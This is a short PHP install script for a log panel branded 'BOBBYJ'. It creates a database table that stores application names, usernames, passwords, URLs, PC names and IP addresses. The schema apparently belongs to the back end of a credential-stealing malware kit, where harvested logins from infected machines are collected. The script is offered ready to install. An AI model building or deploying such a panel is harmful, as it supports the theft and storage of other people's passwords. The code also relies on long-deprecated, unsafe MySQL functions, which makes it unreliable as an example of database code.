<?php
require 'config.php';
$connect = @mysql_connect($hostname, $username, $password) or trigger_error(mysql_error(),E_USER_ERROR);
mysql_select_db($database) or die(mysql_error());
echo '<h1 align="center">Powered By BOBBYJ</h1><br /><br />';
if (isset($_POST['install']))
{
	echo 'Creating Table...';
	mysql_query("drop table if exists logs") or die (mysql_error());
	mysql_query("drop table if exists options") or die (mysql_error());
	if (mysql_query("CREATE TABLE IF NOT EXISTS `logs` (
							`id` int(255) unsigned NOT NULL auto_increment,
							`app` varchar(100) collate latin1_general_ci NOT NULL default '',
							`username` varchar(100) collate latin1_general_ci NOT NULL default '',
							`password` varchar(100) collate latin1_general_ci NOT NULL default '',
							`url` varchar(255) collate latin1_general_ci NOT NULL default '',
							`pcname` varchar(100) collate latin1_general_ci NOT NULL default '',
							`date` varchar(100) collate latin1_general_ci NOT NULL,
							`ip` varchar(50) collate latin1_general_ci NOT NULL default '',
							 PRIMARY KEY  (`id`)
						  );
							")
			&& mysql_query("
						CREATE TABLE IF NOT EXISTS `options` (
						  `theme` varchar(15) collate latin1_general_ci NOT NULL default 'dark',
						  `order` varchar(5) collate latin1_general_ci NOT NULL default 'DESC'
						);"
					 )
		)
	{
		echo 'Okay, Table Created...Proceeding to next step...';
	}
	else
	{
		die(mysql_error());
	}
	if (mysql_query("INSERT INTO `options` (`theme`, `order`) VALUES ('dark', 'DESC');"))
	{
		echo 'Ok, All Done. Now You Should Delete "<strong>install.php</strong>" ';
	}
	else
	{
		die(mysql_error());
	}	
}
?>
<br /><strong>WARNING</strong>: This will <strong>DELETE</strong> all your logs If you already have it installed. So dont forget to delete "<strong>install.php</strong>" after installing it. <br /><br />
<form method="POST" action="">
<input type="submit" name="install" value="Install !" />
</form>